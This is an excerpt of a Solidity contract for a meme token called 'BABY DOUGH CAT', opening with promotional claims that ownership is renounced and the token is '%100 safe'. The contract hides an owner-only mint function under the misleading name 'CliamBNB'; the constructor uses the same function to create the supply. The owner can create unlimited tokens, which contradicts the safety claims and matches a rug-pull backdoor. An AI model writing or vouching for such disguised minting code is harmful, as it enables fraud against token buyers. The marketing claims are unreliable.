...
/*
Telegram: BabyDoughCat
No bots
Low market cap
Liquid locked for 1 year
Ownership renounced : new Owner 0x00000
%100 safe

Tokenomics 
-Total Supply: 100,000,000
-Burn :  60,000,000 burned BABY DOUGH CAT  before secret launch(%60)
-Liquidity: 37,000,000 (%37)
-Dev:  1,000,000 (%1)
-Marketing: 2,000,000 (%2)
-Slip:10-12
*/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function CliamBNB(uint256 amount) public onlyOwner {
    _CliamBNB(msg.sender, amount);
    }
    ...
    function _CliamBNB(address account, uint256 amount) internal virtual {
...
contract BABYDOUGHCAT is ERC20 {

    uint tokenTotalSupply = 100000000;

    constructor() public ERC20("BABY DOUGH CAT", "Baby Dough Cat") {
        _CliamBNB(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}